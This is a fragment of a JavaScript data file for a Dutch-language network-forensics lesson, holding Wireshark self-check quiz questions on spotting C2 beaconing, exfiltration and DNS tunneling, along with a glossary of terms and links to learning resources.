      questions: [
        { q: 'Welk patroon hoort bij "regelmatige kleine verbindingen naar hetzelfde externe IP"?', options: ['C2-beaconing', 'Data-exfiltratie', 'DNS-tunneling', 'Een normale download'], answer: 0, explain: 'Een vast interval en vaste grootte naar één extern IP is het kenmerk van C2-beaconing.' },
        { q: 'Waaraan herken je data-exfiltratie het snelst in Statistics -> Conversations?', options: ['Aan een grote uitgaande overdracht (veel bytes) naar een onbekend extern IP', 'Aan heel veel DNS-queries', 'Aan een lege conversatielijst', 'Aan poort 22'], answer: 0, explain: 'Sorteer op bytes: een ongewoon grote uitgaande stroom naar een vreemd IP valt direct op.' },
        { q: 'Wat hoort in een forensisch rapport gescheiden te blijven?', options: ['Feiten en interpretatie', 'IP-adressen en poorten', 'Tekst en tabellen', 'Datum en tijd'], answer: 0, explain: 'Feiten (wat je zag) en interpretatie (wat het betekent) hou je uit elkaar, zodat je verslag controleerbaar blijft.' },
        { q: 'Ik kan exfiltratie, C2-beaconing en DNS-tunneling uit elkaar houden in een pcap.', noAnswer: true },
      ],
    },
  ],
  terms: [
    { term: 'Pcap (packet capture)', def: 'Een opgenomen bestand met netwerkpakketten; de "opname" van het verkeer.' },
    { term: 'Pakket (packet)', def: 'Een eenheid netwerkverkeer met o.a. bron-IP, bestemmings-IP, protocol en (vaak) inhoud.' },
    { term: 'Wireshark', def: 'Grafische tool om netwerkverkeer op te nemen en te analyseren (met filters, streams en objecten).' },
    { term: 'tcpdump', def: 'Commandoregeltool om netwerkverkeer op te nemen naar een pcap.' },
    { term: 'Display filter', def: 'Zoekregel in Wireshark die alleen de passende pakketten toont, bijv. http of ip.addr==10.10.90.20.' },
    { term: 'Conversations', def: 'Wireshark-overzicht per gesprek (IP naar IP) met pakketten en bytes; sorteren op bytes legt grote overdrachten bloot.' },
    { term: 'Follow Stream', def: 'Functie die de losse pakketten van een conversatie samenvoegt tot een leesbaar geheel.' },
    { term: 'Export Objects', def: 'Functie die overgedragen bestanden (bijv. via HTTP) uit de pcap reconstrueert en opslaat.' },
    { term: 'Data-exfiltratie', def: 'Het ongeoorloofd naar buiten smokkelen van data, vaak zichtbaar als grote uitgaande overdracht.' },
    { term: 'C2 (command-and-control)', def: 'De server waarmee besmette systemen contact houden om opdrachten te ontvangen.' },
    { term: 'Beaconing', def: 'Het regelmatig "inchecken" van malware bij de C2-server; vaste intervallen en vaste pakketgrootte.' },
    { term: 'DNS-tunneling', def: 'Data wegsmokkelen door het in DNS-queries (vaak TXT, lange subdomeinen) te verpakken.' },
    { term: 'TXT-record', def: 'DNS-recordtype dat willekeurige tekst kan bevatten; geliefd voor DNS-tunneling.' },
    { term: 'Credential-diefstal', def: 'Het onderscheppen van inloggegevens, bijvoorbeeld leesbaar in platte (onversleutelde) HTTP.' },
  ],
  resources: [
    { title: 'Wireshark — de tool en documentatie', url: 'https://www.wireshark.org/' },
    { title: 'Forensic Focus — artikelen over netwerkforensie', url: 'https://www.forensicfocus.com/' },
    { title: 'CyberDefenders — oefen met echte pcap-uitdagingen', url: 'https://cyberdefenders.org/' },
    { title: 'NCSC — Nationaal Cyber Security Centrum', url: 'https://www.ncsc.nl/' },
  ],
});
